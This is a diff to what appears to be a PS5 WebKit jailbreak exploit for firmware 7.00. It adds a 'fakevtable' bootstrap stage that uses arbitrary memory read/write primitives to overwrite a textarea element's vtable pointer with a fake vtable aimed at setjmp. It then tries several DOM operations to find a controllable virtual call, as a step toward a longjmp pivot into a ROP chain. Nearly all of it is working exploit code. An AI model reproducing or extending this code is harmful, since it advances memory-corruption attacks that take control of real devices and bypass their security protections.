@@ -227,6 +227,98 @@ async function prepare(p) {
         p.write1(waddr, 0x0);
     }
 
+    // -----------------------------------------------------------------------
+    // 7.00 bootstrap milestone (OFFSET_wk_bootstrap === "fakevtable").
+    //
+    // The idle-Worker hijack that every other profile uses cannot work here:
+    // on JSC 613 the Worker does not park at a return address any scan can find
+    // (its blocking primitive is a raw syscall, and the PLT is `jmp [GOT]`, so
+    // nothing that resumes it does so through a stack `ret` we can overwrite).
+    //
+    // Replacement plan: fake a C++ vtable on the leaked textarea's impl object
+    // and let a virtual dispatch hand us `rdi = this` = a known address. That
+    // is enough for `longjmp(this)` to pivot into a ROP chain, and later to
+    // spawn a dedicated host thread (rop.js thread_rop) so nothing idle is ever
+    // hijacked again.
+    //
+    // This block is ONLY the first, non-destructive verification: point every
+    // fake vtable slot at setjmp and find which JS/DOM operation actually
+    // performs a controllable virtual call. setjmp ignores its args and just
+    // saves registers, so a hit rewrites impl[0..0x48] into a jmp_buf whose
+    // +0x00 is a WebKit text address and +0x10 is a stack address -- a
+    // signature we can read back. That same call captures the return context
+    // the full launcher needs, so a positive result unblocks the rest.
+    if (typeof OFFSET_wk_bootstrap !== "undefined"
+        && OFFSET_wk_bootstrap === "fakevtable") {
+        const SETJMP = libSceLibcInternalBase.add32(OFFSET_lc_setjmp);
+        const impl = textAreaVtPtr;              // C++ HTMLTextAreaElement*
+        const realVtable = textAreaVtable;       // its genuine vtable
+        const N = 64;                            // slots to shadow
+
+        // Build a fake vtable: copy N real entries, then overwrite them all
+        // with setjmp. Any virtual that fires lands on setjmp.
+        const fakeVtable = malloc(0x8 * (N + 2));
+        for (let i = 0; i < N; i++)
+            p.write8(fakeVtable.add32(i * 8), p.read8(realVtable.add32(i * 8)));
+
+        const SIG_LO = SETJMP; // (unused sentinel; kept for symmetry)
+
+        function looksLikeJmpBuf() {
+            const rip = p.read8(impl);                    // impl[0x00]
+            const rsp = p.read8(impl.add32(0x10));        // impl[0x10]
+            const ripInWk = rip.sub32(libSceNKWebKitBase);
+            const wkOk = ripInWk.hi === 0 && (ripInWk.low >>> 0) < 0x3673d22
+                && (ripInWk.low >>> 0) > 0x1000;
+            // a stack pointer on PS5 is a high canonical userland address
+            const stackOk = (rsp.hi >>> 0) >= 0x7 && (rsp.hi >>> 0) <= 0x8ff
+                && (rsp.low & 0xf) === 0;
+            return { wkOk, stackOk, rip, rsp };
+        }
+
+        const trials = [
+            ["focus",   () => textArea.focus()],
+            ["blur",    () => textArea.blur()],
+            ["click",   () => textArea.click()],
+            ["scrollTop", () => { void textArea.scrollTop; }],
+            ["select",  () => textArea.select()],
+            ["nodeName", () => { void textArea.nodeName; }],
+            ["toString", () => { void textArea.toString(); }],
+            ["remove",  () => textArea.remove()]
+        ];
+
+        let winner = null;
+        for (const [name, op] of trials) {
+            // (re)install the fake vtable pointer, then fire the op.
+            p.write8(impl, fakeVtable);
+            jbmark("FVT-TRY", "op=" + name + "-impl=0x" + impl.toString()
+                + "-fakevt=0x" + fakeVtable.toString()
+                + "-setjmp=0x" + SETJMP.toString());
+            let threw = "";
+            try { op(); } catch (e) { threw = String(e && e.message).slice(0, 60); }
+            const r = looksLikeJmpBuf();
+            jbmark("FVT-RESULT", "op=" + name
+                + "-rip=0x" + r.rip.toString() + "-wkOk=" + r.wkOk
+                + "-rsp=0x" + r.rsp.toString() + "-stackOk=" + r.stackOk
+                + (threw ? "-threw=" + threw : ""));
+            if (r.wkOk && r.stackOk) { winner = { name, rip: r.rip, rsp: r.rsp }; break; }
+            // restore the real vtable before the next trial so the textarea is
+            // usable again (setjmp may have clobbered impl[0]).
+            p.write8(impl, realVtable);
+        }
+
+        if (winner) {
+            jbmark("FVT-HIT", "op=" + winner.name
+                + "-savedRip=0x" + winner.rip.toString()
+                + "-savedRsp=0x" + winner.rsp.toString()
+                + "  <== controllable virtual call; set OFFSET_wk_vtable_trigger to this op");
+            throw new Error("bootstrap milestone: fake-vtable virtual call CONFIRMED via '"
+                + winner.name + "'. Next step: wire the longjmp launcher.");
+        }
+        p.write8(impl, realVtable);
+        throw new Error("bootstrap milestone: no trial produced a controllable "
+            + "virtual call. Widen the trials list or reconsider the vector.");
+    }
+
     async function wait_for_worker() {
 
         return new Promise((resolve) => {
